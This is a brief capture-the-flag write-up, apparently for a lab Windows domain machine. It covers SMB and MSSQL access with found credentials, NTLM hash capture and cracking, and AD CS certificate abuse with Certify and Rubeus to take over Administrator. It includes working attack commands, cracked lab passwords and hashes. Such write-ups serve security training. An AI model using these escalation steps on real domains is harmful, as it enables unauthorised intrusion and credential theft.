nmap scanning .
some port need look on : ldap,ms-sql,smb,Samba,Winrm,..

get the file on SMB server -> read that by using evince tool ( pdf viewer on linux)

some note : Ryan,Tom,Brandon

user PublicUser and password GuestUserCantWrite1 .

cmdkey /add:"<serverName>.sequel.htb" /user:"sequel\<userame>" /pass:<password> -> this can notice about the server we need to get. ->sequel.htb

use mssqlclient.py to login that SQL server : python3 mssqlclient.py sequel.htb/PublicUser:GuestUserCantWrite1@sequel.htb

->> use hacktrick book might helpful : https://book.hacktricks.xyz/pentesting-web/sql-injection/mssql-injection

make a smbserver with the file smbserver.py and fetch the path->> get the NTLM hash -> crak with john and get the user and password 

sql_svc
REGGIE1234ronnie


-> login with evil-winrm

some note : Logon failed for user 'sequel.htb\Ryan.Cooper'. Reason: Password did not match that for the login provided.
Logon failed for user 'NuclearMosquito3'. Reason: Password did not match that for the login provided.

-> try to login ?

-> got this from file user.txt in Ryan.Cooper(NuclearMosquito3) desktop : 0d76d9f4c950d9fae209ee4360047f0d

-> need become Adminstrator ..

look back about result from nmap scanning port 389/UDP is open -> this could make AD CS Domain Escalation


->> check certificate in this windows machine ->

source note : https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/ad-certificates/domain-escalation

https://github.com/r3motecontrol/Ghostpack-CompiledBinaries/

https://github.com/GhostPack/Certify -> example 

--> upload file nescessary .

-> exploit -> got some important info from running ./certify file.-> -> we can fetch new request to get admin cer about this vuln.

-> exploit : .\Certify.exe request /ca:dc.sequel.htb\sequel-DC-CA /template:UserAuthentication /altname:Administrator (from hacktrickbook)

got the certificate in adminstrator but it in PEM format (need covert )


->> openssl pkcs12 -export -in cer.pem -inkey private.key -out cert.pfx -name "certificate_export" -CSP "Microsoft Enhanced Cryptographic Provider v1.0"

-> covert to .pfx 
upload file Rubeus.exe to the target machine.

run Rubeus.exe : .\Rubeus.exe asktgt /user:Administrator /certificate:cert.pfx /getcredentials

->> get the NTLM hash of adminstrator : A52F78E4C751E5F5E17E1E9F3E58F4EE -> login as admin and get the root flag.
